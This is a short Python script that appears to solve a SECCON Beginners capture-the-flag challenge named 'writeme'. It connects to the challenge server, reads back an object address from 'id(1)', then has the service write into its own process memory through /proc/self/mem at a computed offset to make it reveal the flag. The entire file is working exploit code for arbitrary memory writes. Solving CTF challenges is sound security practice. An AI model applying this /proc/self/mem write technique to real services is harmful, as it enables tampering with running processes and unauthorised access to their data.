from socket import socket, AF_INET, SOCK_STREAM


BUFFER_SIZE = 1024


def solve():
    with socket(AF_INET, SOCK_STREAM) as sock:
        sock.connect(('writeme.quals.beginners.seccon.jp', 27182))
        sock.recv(BUFFER_SIZE)

        sock.sendall(b'id(1)\n')
        offset = int(sock.recv(1024).decode().split('\n')[0])

        sock.sendall(b'/proc/self/mem\n')
        sock.recv(BUFFER_SIZE)

        sock.sendall(f'{offset + 41 * 32 + 24}\n'.encode())
        flag = sock.recv(BUFFER_SIZE).decode()[:-1]

    return flag


if __name__ == '__main__':
    print(solve())
